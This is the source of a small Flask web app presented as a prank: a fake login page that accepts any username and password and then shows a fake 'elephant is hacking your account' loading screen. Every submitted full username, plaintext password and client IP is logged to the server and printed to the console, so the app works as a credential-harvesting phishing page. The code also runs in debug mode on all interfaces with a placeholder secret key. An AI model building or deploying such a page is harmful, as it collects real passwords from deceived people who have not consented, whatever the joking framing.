from flask import Flask, render_template, request, redirect, url_for, flash
import logging

app = Flask(__name__)
app.secret_key = "change_me_to_a_random_string"

# Make sure logging works (also on Render)
app.logger.setLevel(logging.INFO)


@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()

        # 🔥 Logs FULL username + FULL password + client IP
        # (Funny for this prank, but never do this in a real app.)
        app.logger.info(
            "Login attempt: username=%s, password=%s, ip=%s",
            username,
            password,
            request.remote_addr
        )

        print(f"username = {username}")
        print(f"password = {password}")

        if username and password:
            flash(f"Welcome, {username}!", "success")
            # ⬇️ CHANGED: go to fake loading screen instead of dashboard
            return redirect(url_for("loading"))
        else:
            flash("Please enter a valid username and password.", "error")

    return render_template("login.html")


# ✅ NEW: fake 20s “elephant is hacking your account” screen
@app.route("/loading")
def loading():
    return render_template("loading.html")


@app.route("/dashboard")
def dashboard():
    return render_template("dashboard.html")


if __name__ == "__main__":
    # Only used when running locally
    app.run(host="0.0.0.0", port=5000, debug=True)
